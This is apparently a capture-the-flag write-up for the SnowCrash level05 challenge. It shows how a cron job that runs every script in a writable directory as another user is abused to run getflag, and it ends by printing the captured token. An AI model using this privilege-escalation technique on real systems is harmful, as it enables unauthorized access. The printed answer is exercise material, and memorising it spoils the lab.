when we connect to level05 we have a message
that say you have new mail
by searching on internet i found the linux path for mails
in /var/spool/mail we have a file named level05 which contain the message:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

it's a cron job that execute the openarenaserver script every 2 min

the openarenaserver file contain:
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

the script execute all the files in /opt/openarenaserver and remove them after

so we can create a script in /opt/openarenaserver that will execute the getflag command

level05@SnowCrash:/var/spool/mail$ echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/capture_flag.sh
level05@SnowCrash:/var/spool/mail$ chmod +x /opt/openarenaserver/capture_flag.sh
wait 2 min and cat /tmp/flag.txt
level05@SnowCrash:/var/spool/mail$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
